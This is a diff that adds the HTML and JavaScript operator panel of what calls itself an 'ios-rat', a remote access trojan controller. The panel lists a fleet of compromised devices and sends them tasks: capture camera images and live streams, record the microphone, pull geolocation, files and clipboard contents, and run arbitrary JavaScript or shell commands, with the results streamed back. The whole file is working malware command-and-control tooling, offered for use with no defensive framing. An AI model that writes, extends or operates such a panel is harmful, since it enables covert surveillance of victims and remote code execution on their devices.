@@ -1,0 +1,156 @@
+<!doctype html>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>ios-rat operator</title>
+    <style>
+      :root{--bg:#0c0d10;--fg:#d8dbe0;--dim:#6b7280;--acc:#7dd3fc;--ok:#86efac;--bad:#fca5a5;--line:#1f2228;--purple:#c4b5fd}
+      *{box-sizing:border-box}
+      body{margin:0;background:var(--bg);color:var(--fg);font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
+      header{display:flex;gap:8px;align-items:center;padding:10px 14px;border-bottom:1px solid var(--line);flex-wrap:wrap}
+      input,button{background:#15171c;color:var(--fg);border:1px solid var(--line);border-radius:5px;padding:5px 8px;font:inherit}
+      input:focus{outline:1px solid var(--acc)}
+      button{cursor:pointer}
+      button:hover{border-color:var(--acc)}
+      #wrap{display:grid;grid-template-columns:260px 1fr 280px;height:calc(100vh - 49px)}
+      #fleet{border-right:1px solid var(--line);overflow:auto}
+      .dev{padding:7px 12px;border-bottom:1px solid var(--line);cursor:pointer;display:flex;justify-content:space-between;gap:8px}
+      .dev:hover{background:#12141a}
+      .dev.sel{background:#151a22;border-left:2px solid var(--acc)}
+      .dev small{color:var(--dim)}
+      #main{display:flex;flex-direction:column;overflow:hidden}
+      #log{flex:1;overflow:auto;padding:10px 14px;white-space:pre-wrap;word-break:break-word}
+      #bar{display:flex;gap:6px;padding:8px 12px;border-top:1px solid var(--line);flex-wrap:wrap;align-items:center}
+      .ev{border-left:2px solid var(--line);padding-left:8px;margin-bottom:6px}
+      .ev.frame{border-color:var(--acc)} .ev.result{border-color:var(--ok)} .ev.task{border-color:var(--purple)}
+      .ev.boot{border-color:#fcd34d} .ev.err{border-color:var(--bad)}
+      .k{color:var(--dim)} .v{color:var(--acc)} .bad{color:var(--bad)}
+      #side{border-left:1px solid var(--line);overflow:auto;padding:12px}
+      #side h3{margin:0 0 8px;font-size:12px;color:var(--dim);text-transform:uppercase;letter-spacing:.5px}
+      #cam{width:100%;background:#000;border:1px solid var(--line);border-radius:6px;display:none}
+      #mic{width:100%;margin-top:8px}
+      #media{margin-bottom:16px}
+      textarea{background:#15171c;color:var(--fg);border:1px solid var(--line);border-radius:5px;padding:5px 8px;font:inherit;width:100%}
+      #cmd{flex:1}
+      #evalout{background:#0a0b0e;border:1px solid var(--line);border-radius:5px;padding:6px 8px;margin-top:6px;max-height:160px;overflow:auto;white-space:pre-wrap;word-break:break;font-size:11px;display:none}
+    </style>
+    <header>
+      <strong>ios-rat</strong>
+      <input id="token" placeholder="admin token" size="24">
+      <button id="save">save</button>
+      <button id="reload">reload fleet</button>
+      <span id="status" class="k"></span>
+    </header>
+    <div id="wrap">
+      <div id="fleet"></div>
+      <div id="main">
+        <div id="log"></div>
+        <div id="bar">
+          <button data-op="boot">boot</button>
+          <button data-op="ping">ping</button>
+          <button data-op="geo">geo</button>
+          <button data-op="cam">cam</button>
+          <button data-op="cam.stream">cam.stream</button>
+          <button data-op="mic">mic</button>
+          <button data-op="mic.rec">mic.rec</button>
+          <button data-op="files">files</button>
+          <button data-op="battery">battery</button>
+          <button data-op="clipboard">clipboard</button>
+          <input id="alertt" placeholder="alert text" size="18">
+          <button id="alertb">alert</button>
+          <input id="vibm" placeholder="vibrate ms" size="9">
+          <button id="vibb">vibrate</button>
+          <input id="cmd" placeholder="eval JS: navigator.userAgent" size="34">
+          <button id="go">run</button>
+        </div>
+      </div>
+      <div id="side">
+        <h3>camera</h3>
+        <div id="media"><img id="cam"><audio id="mic" controls style="display:none"></audio></div>
+        <h3>eval result</h3>
+        <div id="evalout"></div>
+      </div>
+    </div>
+    <script>
+    var T = localStorage.getItem('xg_token') || '';
+    var uid = localStorage.getItem('xg_uid') || '';
+    var es = null, camStream = false;
+    document.getElementById('token').value = T;
+    function H() { return T ? { authorization: 'Bearer ' + T } : {}; }
+    function qs(o) { return Object.entries(o).map(function (e) { return encodeURIComponent(e[0]) + '=' + encodeURIComponent(e[1]); }).join('&'); }
+    function log(html, cls) {
+      var d = document.createElement('div');
+      d.className = 'ev ' + (cls || '');
+      d.innerHTML = html;
+      var L = document.getElementById('log'); L.appendChild(d); L.scrollTop = L.scrollHeight;
+    }
+    function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+    function pretty(obj) { try { return esc(JSON.stringify(obj, null, 2)).slice(0, 2000); } catch (e) { return esc(String(obj)); } }
+    function onFrame(b) {
+      var op = b.op || '';
+      if ((op === 'cam' || op === 'cam.stream') && b.data && b.data.image) {
+        var im = document.getElementById('cam'); im.style.display = 'block'; im.src = 'data:image/jpeg;base64,' + b.data.image;
+      } else if ((op === 'mic' || op === 'mic.rec') && b.data && b.data.audio) {
+        var a = document.getElementById('mic'); a.style.display = 'block'; a.src = 'data:audio/webm;base64,' + b.data.audio;
+      } else if (op === 'eval') {
+        var eo = document.getElementById('evalout'); eo.style.display = 'block'; eo.textContent = b.data ? (b.data.error ? 'ERR: ' + b.data.error : (b.data.result !== undefined ? pretty(b.data.result) : pretty(b.data))) : '';
+      }
+    }
+    function show(ev) {
+      var b = ev.body || {};
+      if (ev.kind === 'frame') { onFrame(b); log('<span class="k">' + new Date(b.t || Date.now()).toISOString() + '</span> <span class="v">' + esc(b.op) + '</span> ' + pretty(b.data || {}), 'frame'); }
+      else if (ev.kind === 'result') log('<span class="k">result</span> ' + pretty(b), b.ok === false ? 'err' : 'result');
+      else if (ev.kind === 'task') log('<span class="k">task</span> ' + esc(b.op), 'task');
+      else if (ev.kind === 'boot') log('<span class="k">boot</span> ' + esc(b.uid), 'boot');
+      else log('<span class="k">' + esc(ev.kind) + '</span> ' + pretty(b));
+    }
+    function fleet() {
+      fetch('/admin/list?' + qs({ token: T })).then(function (r) { return r.json(); }).then(function (j) {
+        var f = document.getElementById('fleet'); f.innerHTML = '';
+        (j.devices || []).forEach(function (d) {
+          var el = document.createElement('div');
+          el.className = 'dev' + (d.uid === uid ? ' sel' : '');
+          el.innerHTML = '<span>' + esc(d.uid) + '</span><small>' + new Date(d.last).toLocaleTimeString() + '</small>';
+          el.onclick = function () { uid = d.uid; localStorage.setItem('xg_uid', uid); fleet(); live(); };
+          f.appendChild(el);
+        });
+        document.getElementById('status').textContent = (j.devices || []).length + ' device(s)';
+      });
+    }
+    function live() {
+      if (es) es.close();
+      if (!uid) return;
+      es = new EventSource('/admin/live?' + qs({ uid: uid, token: T }));
+      es.onmessage = function (e) { try { show(JSON.parse(e.data)); } catch (x) {} };
+      es.onerror = function () { document.getElementById('status').textContent = 'stream dropped, reconnecting'; };
+    }
+    function task(op, args) {
+      if (!uid) { log('select a device first', 'err'); return; }
+      fetch('/admin/task?' + qs({ uid: uid, token: T }), { method: 'POST', headers: Object.assign({ 'content-type': 'application/json' }, H()), body: JSON.stringify({ op: op, args: args || {} }) })
+        .then(function (r) { return r.json(); })
+        .then(function (j) { log('<span class="k">sent</span> ' + esc(op) + ' <span class="k">' + esc(j.id || '') + '</span>', 'task'); })
+        .catch(function (e) { log('send failed: ' + e, 'err'); });
+    }
+    document.getElementById('save').onclick = function () {
+      T = document.getElementById('token').value.trim();
+      localStorage.setItem('xg_token', T);
+      fleet(); live();
+    };
+    document.getElementById('reload').onclick = fleet;
+    Array.prototype.forEach.call(document.querySelectorAll('#bar button[data-op]'), function (b) {
+      b.onclick = function () {
+        var op = b.dataset.op;
+        if (op === 'cam.stream') { var on = !camStream; task('cam.stream', { off: !on }); camStream = on; b.textContent = (on ? 'stop ' : 'start ') + 'cam.stream'; }
+        else if (op === 'mic.rec') { var on2 = !camStream; task('mic.rec', { off: !on2 }); b.textContent = (on2 ? 'stop ' : 'start ') + 'mic.rec'; }
+        else task(op);
+      };
+    });
+    document.getElementById('alertb').onclick = function () { task('alert', { text: document.getElementById('alertt').value }); };
+    document.getElementById('vibb').onclick = function () { task('vibrate', { ms: document.getElementById('vibm').value }); };
+    document.getElementById('go').onclick = function () {
+      var v = document.getElementById('cmd').value.trim();
+      if (!v) return;
+      if (/^shell\b/i.test(v)) return task('shell', { cmd: v.replace(/^shell\s+/i, '') });
+      task('eval', { code: v });
+    };
+    fleet(); live();
+    </script>
